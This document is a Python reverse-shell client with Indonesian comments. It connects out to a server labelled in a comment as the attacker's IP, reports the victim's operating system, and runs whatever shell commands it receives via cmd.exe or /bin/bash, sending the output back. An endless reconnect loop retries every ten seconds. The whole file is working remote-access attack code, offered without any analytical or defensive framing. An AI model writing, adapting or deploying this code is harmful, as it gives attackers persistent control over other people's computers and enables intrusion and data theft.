import os
import platform
import socket
import subprocess

# GANTI IP INI DENGAN IP SERVER (ATTACKER) ANDA
SERVER_IP = '127.0.0.1' 
SERVER_PORT = 9999

def get_os_info():
    return f"{platform.system()} {platform.release()}"

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((SERVER_IP, SERVER_PORT))
        # Kirim info OS pertama kali ke server
        s.send(str.encode(get_os_info()))
    except socket.error as e:
        return None
    return s

def run_client():
    s = connect_to_server()
    if not s:
        return

    while True:
        try:
            data = s.recv(1024)
            if not data:
                break
            
            cmd = data.decode("utf-8")
            
            # Mengatasi cek status dari server
            if cmd == 'ping':
                s.send(str.encode('pong'))
                continue
                
            if len(cmd) > 0:
                # Tentukan shell berdasarkan sistem operasi
                if platform.system() == "Windows":
                    # Menggunakan cmd.exe untuk Windows
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                else:
                    # Menggunakan bash/sh untuk Linux (Ubuntu, Xubuntu, Debian, dll)
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, executable='/bin/bash')
                
                output_byte = proc.stdout.read() + proc.stderr.read()
                output_str = str(output_byte, "utf-8", errors="ignore")
                
                # Jika perintah tidak menghasilkan output (seperti `cd`), beri penanda sukses
                if output_str == "":
                    output_str = "\n[Command Executed Successfully]\n"
                
                s.send(str.encode(output_str))
        except Exception:
            break
            
    s.close()

if __name__ == '__main__':
    # Loop infinity agar client terus mencoba reconnect jika koneksi mati
    import time
    while True:
        try:
            run_client()
        except Exception:
            pass
        time.sleep(10)  # Coba reconnect setiap 10 detik jika gagal
